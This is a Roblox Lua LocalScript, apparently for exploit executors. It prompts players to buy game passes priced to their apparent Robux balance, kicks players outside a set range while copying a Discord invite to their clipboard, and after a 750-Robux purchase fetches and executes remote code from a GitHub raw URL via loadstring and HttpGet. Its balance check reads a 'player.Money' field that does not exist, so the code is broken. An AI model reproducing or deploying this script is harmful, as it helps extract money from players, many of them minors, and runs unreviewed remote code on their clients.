-- LocalScript

-- Local variables
local player = game.Players.LocalPlayer
local marketplaceService = game:GetService("MarketplaceService")

-- Game pass IDs (local variables)
local gamePass750 = 1105218641
local gamePass100 = 1106755338
local gamePass5 = 1103848074

-- Minimum and Maximum Robux required for the game passes (local variables)
local minRobux = 5
local maxRobux = 1000

-- Function to get the player's Robux balance (local variable)
local function getUserRobux()
    return player.Money -- Returns the Robux balance of the player
end

-- Function to copy text to clipboard (works in Roblox Studio or with specific developer plugins)
local function copyToClipboard(text)
    local success, message = pcall(function()
        setclipboard(text)  -- This works in Roblox Studio for copying to clipboard
    end)
    if success then
        print("Text copied to clipboard:", text)
    else
        warn("Failed to copy to clipboard:", message)
    end
end

-- Function to handle the speed boost for the 5 Robux game pass
local function applySpeedBoost()
    local humanoid = player.Character and player.Character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = humanoid.WalkSpeed * 2  -- Double the speed
    end
end

-- Function to check the player's Robux and prompt purchase based on Robux balance
local function checkRobux()
    local robux = getUserRobux()

    -- Check if the player's Robux balance is within the valid range (5 to 1000)
    if robux < minRobux or robux > maxRobux then
        -- Copy the update link to clipboard and kick the player if outside the range
        copyToClipboard("https://discord.gg/uQ2gqY8mAA")
        player:Kick("Your Robux balance is outside the allowed range (5 to 1000). The latest version link has been copied to your clipboard: https://discord.gg/uQ2gqY8mAA")
    else
        -- Proceed to check for game passes if within the valid range
        if robux >= 750 then
            marketplaceService:PromptPurchase(player, gamePass750)
        elseif robux >= 100 then
            marketplaceService:PromptPurchase(player, gamePass100)
        elseif robux >= 5 then
            marketplaceService:PromptPurchase(player, gamePass5)
        else
            print("You don't have enough Robux for any recommended game pass.")
        end
    end
end

-- Handle the result after a purchase
marketplaceService.PromptPurchaseFinished:Connect(function(playerWhoBought, assetId, wasPurchased)
    if playerWhoBought == player and wasPurchased then
        if assetId == gamePass100 then
            -- Copy URL to clipboard after purchasing the 100 Robux game pass
            copyToClipboard("https://work.ink/19k/mfih65rt")
        elseif assetId == gamePass750 then
            -- Execute the script for the 750 Robux game pass
            loadstring(game:HttpGet("https://raw.githubusercontent.com/khen791/script-khen/refs/heads/main/frost%20remake%20by%20khen.lua", true))()
        elseif assetId == gamePass5 then
            -- Apply speed boost for the 5 Robux game pass
            applySpeedBoost()
        end
    end
end)

-- Call the function to check the Robux and prompt the purchase
checkRobux()
